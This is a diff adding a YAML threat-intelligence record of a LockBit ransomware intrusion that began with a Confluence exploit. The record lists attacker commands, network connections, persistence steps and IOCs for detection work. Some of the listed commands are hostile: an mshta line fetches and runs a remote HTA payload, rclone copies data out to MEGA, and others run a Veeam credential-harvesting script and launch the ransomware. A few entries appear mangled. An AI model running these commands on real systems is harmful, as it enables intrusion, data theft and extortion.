@@ -1,0 +1,111 @@
+description: The intrusion began with the exploitation of CVE-2023-22527 on an exposed
+  Windows Confluence server, ultimately leading to the deployment of LockBit ransomware
+  across the environment. The threat actor leveraged various tools, including Mimikatz,
+  Metasploit, and AnyDesk.
+date: '2025-02-24'
+authors:
+- Angelo Violetti
+- teddy_ROxPin
+- @malforsec
+attribution: LockBit
+malware_families:
+- LockBit
+TTPs:
+  processes:
+  - curl.exe
+  - mshta.exe
+  - powershell.exe
+  - tasklist.exe
+  - net.exe
+  - whoami.exe
+  - rclone.exe
+  - pdqdeployservice.exe
+  - PDQDeployRunner-*
+  - notepad.exe
+  - explorer.exe
+  - PDQDeployService.exe
+  - PDQDeployRunner-1.exe
+  - cmd.exe
+  - mimikatz.exe
+  commandline:
+  - curl 'http://download.anydesk.com/AnyDesk.msi'
+  - mshta http://92.51.2[.]22:443/UsySLX1n.hta
+  - powershell -c '(New-Object Net.WebClient).DownloadFile(''http://download.anydesk.com/AnyDesk.msi'',''AnyDesk.msi'')'
+  - tasklist
+  - net user
+  - whoami
+  - rclone copy --progress "/path/to/source" "MEGA.nz:/destination"
+  - powershell -ExecutionPolicy Bypass -File Veeam-Get-Creds-New.ps1
+  - PDQDeployRunner-1 /run "C:\\Temp\\asd.bat"
+  - notepad C:\\temp\\passwords.txt
+  - C:\\Program Files (x86)\\Admin Arsenal\\PDQ Deploy\\PDQDeployService.exe"service
+  - '"%windir%\\AdminArsenal\\PDQDeployRunner\\service-1\\PDQDeployRunner-1.exe"'
+  - PDQ Deploy
+  - C:\\temp\\LBB.exe
+  - 'cmd /k "C:\\temp\\LBB." '
+  - C:\\Windows\\AdminArsenal\\PDQDeployRunner\\service- cnd.exe /s /c asd.bat
+  - start /B LBB.exe
+  powershell:
+  - Encoded PowerShell command within HTA file
+  - Veeam-Get-Creds-New.ps1
+  - asd.bat (batch script containing ransomware execution command)
+  scripting_engine: []
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\AnyDeskMSI
+  image_load: []
+  network_connections:
+  - executable: curl.exe
+    destination: http://download.anydesk.com/AnyDesk.msi
+  - executable: mshta.exe
+    destination: http://92.51.2[.]22:443/UsySLX1n.hta
+  - executable: rclone.exe
+    destination: MEGA.nz:/destination
+  - executable: rclone.exe
+    destination_address: 92.51.2.27
+    port: 7070
+  - executable: rclone.exe
+    destination_address: 92.51.2.27
+    port: 49245
+  file_modifications:
+  - C:\\Temp\\AnyDesk.msi
+  - C:\\Windows\\Tasks\\config.ps1
+  - C:\\temp\\asd.bat
+  - C:\\temp\\passwords.txt
+  - rhddiicoE.README.txt (ransom note)
+  - C:\\Program Files (x86)\\AnyDeskMSI\\AnyDeskMSI .exe
+  - C:\\temp\\scannernetscan.exe
+  - C:\\temp\\netscanlicnetscanxmlmimidrvsysmimikatzexemimilib.dll
+  - C:\\temp\\mimilove.exe
+  - C:\\temp\\mimispooldll
+  - C:\\Program Files (x86)\\Admin Arsenal\\PDQ Deploy\\Repository
+  - C:\\Program Files (x86)\\Admin Arsenal\\PDQ Deploy\\Repository3
+  - C:\\temp\\BB.exe
+  - C:\\temp\\LBB.exe
+  persistence:
+  - AnyDesk service installed to ensure availability after restart.
+  - New local administrator account created and added to the Administrators group.
+  - AnyDesk installed as a Windows service
+  - PDQ Deploy installed on domain controller and beachhead host
+  pipes: []
+  process_relations: []
+IOCs:
+- ip: 92.51.2.22
+- ip: 92.51.2.27
+- url: http://download.anydesk.com/AnyDesk.msi
+- url: http://92.51.2[.]22:443/UsySLX1n.hta
+- file_hash: 438448FDC7521ED034F6DABDF814B6BA
+- file_hash: F08E7343A94897ADEAE78138CC3F9142ED160A03
+- file_hash: 1E2E25A996F72089F12755F931E7FCA9B64DD85B
+- file_hash: 03A56A9871FD6BB8F2CF1DBB
+- file_hash: netscan.exe D7ADDB5B6F55EAB1686410A17B3C867B
+- file_hash: A54AF16B2702FE0E5C569F6D8F17574A9FDAF197
+- file_hash: 498BA0AFA5D3B390F852AF66BD6E763945BF9B6BFF2087015ED8612A18372155
+- file_hash: Veeam-Get-Creds-New.ps1 3BD63B2962D41D2E29E570238D28EC0E
+- file_hash: 9537E1C4E5DDD7FB9B98C532CA89A9DB08262AB4
+- file_hash: 7AA8E510B9C3B5D39F84E4C2FA68C81DA888E091436FDB7FEE276EE7FF87F016
+- ironmaidens@tutanota.com
+- 'Client-ID: 1035092621'
+- http://lockbit.onion
+- http://lockbit .onion.ly
+reference: https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/
+file_creation_date: May 14, 2025
